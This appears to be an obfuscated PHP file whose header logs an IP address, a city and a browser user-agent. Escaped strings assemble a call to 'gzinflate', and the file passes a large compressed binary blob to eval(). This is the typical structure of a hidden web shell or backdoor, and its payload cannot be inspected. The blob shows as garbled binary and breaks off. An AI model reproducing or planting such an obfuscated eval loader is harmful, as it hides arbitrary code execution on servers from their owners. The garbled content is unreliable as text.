<?php
/***
Date		:	2021-03-04 Thursday 18:12:17
Ipaddress		:	120.188.39.33
City		:	Jakarta
Country		:	ID
Region		:	Jakarta
Organization		:	Unknown
User-Agent		:	Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
***/
if(!version_compare(PHP_VERSION,'5.6','>='))exit(eval("\145"."c\150\157\40\47"."P"."H"."P"." "."'\x2e\x50\x48"."P\x5f\126\105\x52\x53\x49\x4f\116\56\47\x20"."r\x65\161"."u\151"."r\145\x73\x20\x50\110\x50\x20\65\x2e\66\x20\157"."r"." \x68"."i\x67\150\x65\x72\x2e"."'\x3b"));$���ŵ�="\147"."z\x69\156\x66\x6c\141\164\145";eval($���ŵ�("�X	T�W�6�x�Oډg:m�N��R%Bɢ�oh��\$�h왉-��XK\$&v�(�Z�E�� �%*��l\";Xle�� � 8���Eq<s��:��{�~w{�53[�Ûf���=���#�>7�lF��oN?��|����ۻ8}�wp=�7���;#�8<d����ٻF+��W9�z��M� A����űws������p�:�� Aq�^|w'W��ή���ǹ�<]O��d�q�z����QG��i�q'w�c��M&���?��r��db��{����C+������L�wvv=u��Z��3�6m���0�F��Ԑ!	S�<��E\\�7�3�_5g�\"�F��dBdzNv?ŉ�-���&V�3R9���̉��F52H�{��2(+���1�!-U�b�G,h�[]��7�� s/k6���T���T0c[/k�1@2���P_PhX�g�Y���jC��YZ1���>��
